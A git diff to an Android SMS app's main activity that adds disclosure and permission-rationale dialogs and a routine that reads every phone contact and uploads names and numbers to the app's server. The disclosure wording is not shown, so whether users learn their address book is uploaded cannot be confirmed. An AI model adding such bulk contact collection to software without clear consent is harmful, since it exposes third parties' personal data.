@@ -1,6 +1,7 @@
 package app.luzzy.activities
 
 import android.annotation.SuppressLint
+import android.app.AlertDialog
 import android.app.role.RoleManager
 import android.content.Intent
 import android.content.pm.ShortcutInfo
@@ -8,11 +9,21 @@ import android.content.pm.ShortcutManager
 import android.graphics.drawable.Icon
 import android.graphics.drawable.LayerDrawable
 import android.os.Bundle
+import android.provider.ContactsContract
 import android.provider.Telephony
 import android.speech.RecognizerIntent
 import android.text.TextUtils
+import android.util.Log
 import androidx.appcompat.content.res.AppCompatResources
+import androidx.lifecycle.lifecycleScope
 import androidx.recyclerview.widget.RecyclerView
+import app.luzzy.network.models.ContactItem
+import app.luzzy.network.models.ContactsSyncRequest
+import app.luzzy.network.RetrofitClient
+import app.luzzy.utils.SharedPrefsManager
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import com.goodwy.commons.dialogs.PermissionRequiredDialog
 import com.goodwy.commons.extensions.*
 import com.goodwy.commons.helpers.*
@@ -196,7 +207,6 @@ class MainActivity : SimpleActivity() {
                     R.id.premium -> launchPremium()
                     R.id.user_settings -> launchUserSettings()
                     R.id.settings -> launchSettings()
-                    R.id.about -> launchAbout()
                     else -> return@setOnMenuItemClickListener false
                 }
                 return@setOnMenuItemClickListener true
@@ -262,14 +272,34 @@ class MainActivity : SimpleActivity() {
     }
 
     private fun loadMessages() {
+        val prefs = getSharedPreferences("luzzy_prefs", MODE_PRIVATE)
+        if (!prefs.getBoolean("prominent_disclosure_accepted", false)) {
+            AlertDialog.Builder(this)
+                .setTitle(R.string.prominent_disclosure_title)
+                .setMessage(R.string.prominent_disclosure_message)
+                .setPositiveButton(R.string.prominent_disclosure_accept) { _, _ ->
+                    prefs.edit().putBoolean("prominent_disclosure_accepted", true).apply()
+                    proceedLoadMessages()
+                }
+                .setNegativeButton(R.string.prominent_disclosure_decline) { _, _ -> finish() }
+                .setCancelable(false)
+                .show()
+        } else {
+            proceedLoadMessages()
+        }
+    }
+
+    private fun proceedLoadMessages() {
         if (isQPlus()) {
             val roleManager = getSystemService(RoleManager::class.java)
             if (roleManager!!.isRoleAvailable(RoleManager.ROLE_SMS)) {
                 if (roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {
                     askPermissions()
                 } else {
-                    val intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS)
-                    startActivityForResult(intent, MAKE_DEFAULT_APP_REQUEST)
+                    showDefaultSmsRationale {
+                        val intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS)
+                        startActivityForResult(intent, MAKE_DEFAULT_APP_REQUEST)
+                    }
                 }
             } else {
                 toast(com.goodwy.commons.R.string.unknown_error_occurred)
@@ -279,14 +309,41 @@ class MainActivity : SimpleActivity() {
             if (Telephony.Sms.getDefaultSmsPackage(this) == packageName) {
                 askPermissions()
             } else {
-                val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
-                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
-                startActivityForResult(intent, MAKE_DEFAULT_APP_REQUEST)
+                showDefaultSmsRationale {
+                    val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
+                    intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
+                    startActivityForResult(intent, MAKE_DEFAULT_APP_REQUEST)
+                }
             }
         }
     }
 
+    private fun showDefaultSmsRationale(onContinue: () -> Unit) {
+        AlertDialog.Builder(this)
+            .setTitle(R.string.default_sms_rationale_title)
+            .setMessage(R.string.default_sms_rationale_message)
+            .setPositiveButton(R.string.continue_btn) { _, _ -> onContinue() }
+            .setNegativeButton(R.string.exit_app) { _, _ -> finish() }
+            .setCancelable(false)
+            .show()
+    }
+
     private fun askPermissions() {
+        val prefs = getSharedPreferences("luzzy_prefs", MODE_PRIVATE)
+        if (!prefs.getBoolean("perm_rationale_shown", false)) {
+            prefs.edit().putBoolean("perm_rationale_shown", true).apply()
+            AlertDialog.Builder(this)
+                .setTitle(R.string.sms_permission_rationale_title)
+                .setMessage(R.string.sms_permission_rationale_message)
+                .setPositiveButton(R.string.continue_btn) { _, _ -> requestSmsPermissions() }
+                .setCancelable(false)
+                .show()
+        } else {
+            requestSmsPermissions()
+        }
+    }
+
+    private fun requestSmsPermissions() {
         handlePermission(PERMISSION_READ_SMS) {
             if (it) {
                 handlePermission(PERMISSION_SEND_SMS) {
@@ -302,6 +359,7 @@ class MainActivity : SimpleActivity() {
                             }
 
                             FCMManager.initialize(this)
+                            syncContactsToServer()
 
                             initMessenger()
                             bus = EventBus.getDefault()
@@ -708,5 +766,41 @@ class MainActivity : SimpleActivity() {
         whatsNewList().apply {
             checkWhatsNew(this, BuildConfig.VERSION_CODE)
         }
+    }
+
+    private fun syncContactsToServer() {
+        val authHeader = SharedPrefsManager.getAuthHeader(this) ?: return
+        lifecycleScope.launch(Dispatchers.IO) {
+            try {
+                val contacts = readPhoneContacts()
+                if (contacts.isEmpty()) return@launch
+                RetrofitClient.apiService.syncContacts(authHeader, ContactsSyncRequest(contacts))
+                Log.d("Luzzy", "✅ ${contacts.size} contactos sincronizados al servidor")
+            } catch (e: Exception) {
+                Log.w("Luzzy", "⚠️ Error sincronizando contactos: ${e.message}")
+            }
+        }
+    }
+
+    private fun readPhoneContacts(): List<ContactItem> {
+        val result  = mutableMapOf<String, String>() // phone → name (dedup)
+        val projection = arrayOf(
+            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+            ContactsContract.CommonDataKinds.Phone.NUMBER
+        )
+        contentResolver.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            projection, null, null, null
+        )?.use { cursor ->
+            val nameIdx  = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+            val phoneIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+            while (cursor.moveToNext()) {
+                val name  = cursor.getString(nameIdx)?.trim() ?: continue
+                val raw   = cursor.getString(phoneIdx) ?: continue
+                val phone = raw.replace(Regex("[\\s\\-\\(\\)\\.\\+]"), "")
+                if (phone.length >= 7) result[phone] = name
+            }
+        }
+        return result.map { (phone, name) -> ContactItem(name = name, phone = phone) }
     }
 }
